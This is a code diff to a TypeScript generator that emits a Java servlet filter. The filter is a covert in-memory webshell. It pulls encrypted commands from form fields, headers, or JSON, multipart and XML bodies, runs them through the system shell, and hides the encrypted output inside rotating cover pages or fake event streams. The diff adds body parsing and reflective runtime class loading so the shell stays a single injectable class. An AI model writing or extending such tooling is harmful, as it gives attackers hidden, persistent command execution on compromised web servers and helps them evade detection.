@@ -26,9 +26,78 @@ export interface FilterTemplateOptions {
   secret: string;
   /** Carrier field names (form fields / headers) that may hold the ciphertext. */
   fields: string[];
-  /** Cover pages from the site profile (raw HTML, rotated per response). */
-  templates: string[];
+  /**
+   * Lowercase Content-Type needles (contains-match): the body is read only
+   * when its Content-Type matches one — derived from the profile's body
+   * shapes. Empty = never touch the body stream: reading a body the shell
+   * doesn't own consumes it and breaks the app behind us.
+   */
+  bodyContentTypes: string[];
+  /** Cover bodies from the site profile (rotated per response, each with its contentType). */
+  templates: Array<{ template: string; contentType: string }>;
   cipher: MimicCipher;
+  /**
+   * Base64 bytes of the body-wrapper classes (renderWrapperJava, compiled by
+   * the build's first phase). The filter self-defines them at runtime so the
+   * uploaded shell stays a single self-contained class — MemShellParty's
+   * Custom generator can only resolve one class.
+   */
+  wrapper: { bodyB64: string; streamB64: string };
+}
+
+/**
+ * The body-caching request wrapper, as a standalone fixed source — compiled
+ * in the build's first phase, then embedded into the filter as base64 (it
+ * self-defines the classes at runtime). Kept anonymous-class-free ON
+ * PURPOSE: every named .class file must be embedded and defined explicitly.
+ */
+export function renderWrapperJava(): string {
+  return `package mimic;
+
+import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+/** Re-exposes a consumed request body to downstream filters/servlets. */
+public class CachedBody extends HttpServletRequestWrapper {
+    private final byte[] body;
+
+    public CachedBody(HttpServletRequest req, byte[] body) {
+        super(req);
+        this.body = body;
+    }
+
+    public ServletInputStream getInputStream() {
+        return new Stream(body);
+    }
+
+    public BufferedReader getReader() {
+        return new BufferedReader(new InputStreamReader(getInputStream()));
+    }
+
+    static class Stream extends ServletInputStream {
+        private final ByteArrayInputStream in;
+
+        Stream(byte[] body) {
+            this.in = new ByteArrayInputStream(body);
+        }
+
+        public int read() {
+            return in.read();
+        }
+
+        public boolean isFinished() {
+            return in.available() == 0;
+        }
+
+        public boolean isReady() {
+            return true;
+        }
+
+        public void setReadListener(ReadListener l) {}
+    }
+}
+`;
 }
 
 /** Escape a string for embedding as a Java string literal (non-ASCII -> \uXXXX). */
@@ -40,6 +109,49 @@ export function javaStringLiteral(s: string): string {
     .replaceAll("\n", "\\n")
     // eslint-disable-next-line no-control-regex
     .replaceAll(/[^\x00-\x7f]/g, (ch) => `\\u${ch.codePointAt(0)!.toString(16).padStart(4, "0")}`);
+}
+
+/** Java for the runtime self-loader (defines the embedded wrapper classes once). */
+function wrapperLoaderMethods(opts: FilterTemplateOptions): string {
+  return `
+    /** wrapper class bytes (mimic.CachedBody + its stream) — embedded so the
+        uploaded shell stays a single self-contained class file */
+    static final String WRAPPER_B64 = "${opts.wrapper.bodyB64}";
+    static final String WRAPPER_STREAM_B64 = "${opts.wrapper.streamB64}";
+
+    static Class<?> forNameQuiet(String name, ClassLoader cl) {
+        try {
+            return Class.forName(name, true, cl);
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
+    static Class<?> defineQuiet(ClassLoader cl, String name, String b64) {
+        try {
+            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass",
+                String.class, byte[].class, int.class, int.class);
+            m.setAccessible(true);
+            byte[] bytes = java.util.Base64.getDecoder().decode(b64);
+            return (Class<?>) m.invoke(cl, name, bytes, 0, bytes.length);
+        } catch (Throwable t) {
+            return null; // another shell in this JVM already defined it
+        }
+    }
+
+    /** Wrap the request so downstream code can re-read the JSON body we consumed. */
+    static HttpServletRequest wrapBody(HttpServletRequest req, byte[] body) throws Exception {
+        ClassLoader cl = ${opts.className}.class.getClassLoader();
+        Class<?> c = forNameQuiet("mimic.CachedBody", cl);
+        if (c == null) {
+            defineQuiet(cl, "mimic.CachedBody$Stream", WRAPPER_STREAM_B64);
+            c = defineQuiet(cl, "mimic.CachedBody", WRAPPER_B64);
+            if (c == null) c = forNameQuiet("mimic.CachedBody", cl);
+        }
+        return (HttpServletRequest) c.getConstructor(HttpServletRequest.class, byte[].class)
+            .newInstance(req, body);
+    }
+`;
 }
 
 // ---------------------------------------------------------------------------
@@ -201,9 +313,11 @@ function sharedMethods(cipher: MimicCipher): string {
 // ---------------------------------------------------------------------------
 
 export function renderFilterJava(opts: FilterTemplateOptions): string {
-  const { className, pass, secret, fields, templates, cipher } = opts;
+  const { className, pass, secret, fields, bodyContentTypes, templates, cipher } = opts;
   const fieldsJava = fields.map((f) => `"${javaStringLiteral(f)}"`).join(", ");
-  const tplsJava = templates.map((t) => `        "${javaStringLiteral(t)}"`).join(",\n");
+  const bodyCtsJava = bodyContentTypes.map((n) => `"${javaStringLiteral(n)}"`).join(", ");
+  const tplsJava = templates.map((t) => `        "${javaStringLiteral(t.template)}"`).join(",\n");
+  const ctsJava = templates.map((t) => `"${javaStringLiteral(t.contentType)}"`).join(", ");
 
   return `package mimic;
 
@@ -219,36 +333,119 @@ import javax.servlet.http.*;
  * mimic protocol server (matches src/connect/mimic-codecs.ts):
  *   cipher=${cipher.algorithm} encoding=${cipher.encoding} padTail=${cipher.padTail} marker=${cipher.marker}
  *
- * Detection uses getParameter()/getHeader() only, never reads the body
- * stream: form posts are parsed+cached by the container so downstream
- * getParameter() callers still work, and raw-body posts (Behinder) keep an
- * untouched body stream for the shell behind us. Anything that is not ours
- * falls through chain.doFilter; any error answers with the cover page.
+ * Detection uses getParameter()/getHeader() first, never touching the body
+ * stream. For JSON bodies it reads the stream ONCE and re-exposes it via a
+ * caching wrapper, so the app's own endpoints (and other shells behind us)
+ * still see the body. Anything that is not ours falls through chain.doFilter;
+ * any error answers with the plain cover template.
  */
 public class ${className} implements Filter {
     /** carriers that may hold the ciphertext (form fields / headers, from the profile) */
     static final String[] FIELDS = { ${fieldsJava} };
+    /** body Content-Type needles the shell owns — anything else passes with its body untouched */
+    static final String[] BODY_CTS = { ${bodyCtsJava} };
     /** credentials — must match the client's --pass/--key (key + marker derivation) */
     static final String PASS = "${javaStringLiteral(pass)}";
     static final String SECRET = "${javaStringLiteral(secret)}";
-    /** Cover pages from the site profile — rotated per response so the skin varies. */
+    /** Cover bodies from the site profile — rotated per response so the skin varies. */
     static final String[] TPLS = {
 ${tplsJava}
     };
+    /** Content-Type of each cover body (parallel to TPLS). */
+    static final String[] CTS = { ${ctsJava} };
 
     public void init(FilterConfig filterConfig) {}
     public void destroy() {}
 ${sharedMethods(cipher)}${wrapPayloadMethod(cipher.marker)}
+    static byte[] readAll(InputStream in) throws IOException {
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        byte[] buf = new byte[8192];
+        int n;
+        while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
+        return bos.toByteArray();
+    }
+
+    /** read the body only when its Content-Type is one the profile actually uses */
+    static boolean ctMatches(String ct) {
+        String l = ct.toLowerCase();
+        for (String n : BODY_CTS) if (l.contains(n)) return true;
+        return false;
+    }
+
+    /** minimal "field":"value" extraction — cipher values carry no quotes/escapes */
+    static String jsonField(String body, String field) {
+        String needle = "\\"" + field + "\\"";
+        int i = body.indexOf(needle);
+        if (i < 0) return null;
+        int colon = body.indexOf(':', i + needle.length());
+        if (colon < 0) return null;
+        int q1 = body.indexOf('"', colon + 1);
+        if (q1 < 0) return null;
+        int q2 = body.indexOf('"', q1 + 1);
+        if (q2 < 0) return null;
+        return body.substring(q1 + 1, q2);
+    }
+
+    /** minimal multipart extraction: the value follows the part headers of name="field" */
+    static String multipartField(String body, String field) {
+        String needle = "name=\\"" + field + "\\"";
+        int i = body.indexOf(needle);
+        if (i < 0) return null;
+        int sep = body.indexOf("\\r\\n\\r\\n", i + needle.length());
+        int sepLen = 4;
+        if (sep < 0) { sep = body.indexOf("\\n\\n", i + needle.length()); sepLen = 2; }
+        if (sep < 0) return null;
+        int start = sep + sepLen;
+        int end = body.indexOf('\\n', start);
+        if (end < 0) end = body.length();
+        String v = body.substring(start, end).trim();
+        return v.isEmpty() ? null : v;
+    }
+
+    /** minimal XML extraction: <field>value</field> */
+    static String xmlField(String body, String field) {
+        String open = "<" + field + ">";
+        int i = body.indexOf(open);
+        if (i < 0) return null;
+        int start = i + open.length();
+        int end = body.indexOf("</" + field + ">", start);
+        if (end < 0) return null;
+        return body.substring(start, end);
+    }
+${wrapperLoaderMethods(opts)}
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
             throws IOException, ServletException {
+        HttpServletRequest httpReq = request instanceof HttpServletRequest
+                ? (HttpServletRequest) request : null;
         String value = null;
         for (String f : FIELDS) {
             value = request.getParameter(f);
-            if (value == null && request instanceof HttpServletRequest) {
+            if (value == null && httpReq != null) {
                 // secretIn=header: the ciphertext may ride a header instead of a form field
-                value = ((HttpServletRequest) request).getHeader(f);
+                value = httpReq.getHeader(f);
             }
             if (value != null) break;
+        }
+        if (value == null && httpReq != null) {
+            // the ciphertext may ride a raw body of any bodyTemplate shape
+            // (JSON / multipart / XML…). Read it once and re-expose it
+            // downstream via the caching wrapper.
+            String ct = httpReq.getContentType();
+            if (ct != null && ctMatches(ct)) {
+                try {
+                    byte[] bodyBytes = readAll(httpReq.getInputStream());
+                    String bodyText = new String(bodyBytes, "UTF-8");
+                    for (String f : FIELDS) {
+                        value = jsonField(bodyText, f);
+                        if (value == null) value = multipartField(bodyText, f);
+                        if (value == null) value = xmlField(bodyText, f);
+                        if (value != null) break;
+                    }
+                    request = wrapBody(httpReq, bodyBytes);
+                } catch (Throwable wrapperFailed) {
+                    // the body is already consumed — pass through as-is
+                }
+            }
         }
         if (value == null) {
             chain.doFilter(request, response);
@@ -261,11 +458,13 @@ ${sharedMethods(cipher)}${wrapPayloadMethod(cipher.marker)}
             cmd = decryptField(value, aesKey);
         } catch (Exception notOurs) {
             // the field exists but doesn't decrypt — this is someone else's
-            // legitimate form (e.g. the real login POST), stay invisible
+            // legitimate request (e.g. the real login POST), stay invisible
             chain.doFilter(request, response);
             return;
         }
-        String tpl = TPLS[new java.util.Random().nextInt(TPLS.length)];
+        int ti = new java.util.Random().nextInt(TPLS.length);
+        String tpl = TPLS[ti];
+        String tplCt = CTS[ti];
         try {
             String command = new String(cmd, "UTF-8");
             boolean win = System.getProperty("os.name").toLowerCase().contains("win");
@@ -274,22 +473,37 @@ ${sharedMethods(cipher)}${wrapPayloadMethod(cipher.marker)}
                 : new ProcessBuilder("/bin/sh", "-c", command);
             pb.redirectErrorStream(true);
             Process proc = pb.start();
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            InputStream in = proc.getInputStream();
-            byte[] buf = new byte[8192];
-            int n;
-            while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
             proc.waitFor();
-            String payload = encryptField(bos.toByteArray(), aesKey);
-            String fragment = wrapPayload(payload, PASS + SECRET);
-            int idx = tpl.toLowerCase().lastIndexOf("</body>");
-            String page = idx >= 0 ? tpl.substring(0, idx) + fragment + tpl.substring(idx) : tpl + fragment;
-            response.setContentType("text/html;charset=UTF-8");
+            String payload = encryptField(readAll(proc.getInputStream()), aesKey);
+            String page;
+            if (tpl.contains("{{payload}}")) {
+                // placeholder template (any text format): substitute exactly there
+                page = tpl.replace("{{payload}}", payload);
+            } else {
+                String fragment = wrapPayload(payload, PASS + SECRET);
+                int idx = tpl.toLowerCase().lastIndexOf("</body>");
+                page = idx >= 0 ? tpl.substring(0, idx) + fragment + tpl.substring(idx) : tpl + fragment;
+            }
+            response.setContentType(tplCt);
             response.setCharacterEncoding("UTF-8");
-            response.getWriter().write(page);
+            if (tplCt.contains("event-stream")) {
+                // flush chunk by chunk — a real SSE endpoint streams, a
+                // one-shot body is the wrong shape on the wire
+                java.io.PrintWriter w = response.getWriter();
+                for (String chunk : page.split("\\n\\n", -1)) {
+                    if (chunk.isEmpty()) continue;
+                    w.write(chunk);
+                    w.write("\\n\\n");
+                    w.flush();
+                    response.flushBuffer();
+                    try { Thread.sleep(30); } catch (InterruptedException ie) { break; }
+                }
+            } else {
+                response.getWriter().write(page);
+            }
         } catch (Exception e) {
-            // behave like the cover page on any error — stay quiet
-            response.setContentType("text/html;charset=UTF-8");
+            // behave like the cover body on any error — stay quiet
+            response.setContentType(tplCt);
             response.getWriter().write(tpl);
         }
     }
